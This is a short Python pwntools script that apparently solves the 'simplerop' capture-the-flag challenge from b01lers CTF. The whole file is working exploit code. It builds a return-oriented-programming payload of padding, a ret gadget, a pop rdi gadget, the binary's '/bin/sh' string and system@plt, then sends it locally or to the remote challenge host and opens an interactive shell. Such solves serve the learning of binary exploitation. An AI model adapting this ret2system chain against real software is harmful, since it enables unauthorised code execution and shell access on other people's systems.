#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./simplerop')
binary.plt['system'] = 0x401080 # see .plt.sec in ghidra or GDB output
context.log_level = 'INFO'

if not args.REMOTE:
	context.log_file = 'local.log'
	p = process(binary.path)
else:
	context.log_file = 'remote.log'
	p = remote('chal.ctf.b01lers.com', 1008)

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = 0x8 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binary.search(b'/bin/sh').__next__())
payload += p64(binary.plt.system)

p.sendline(payload)
p.interactive()
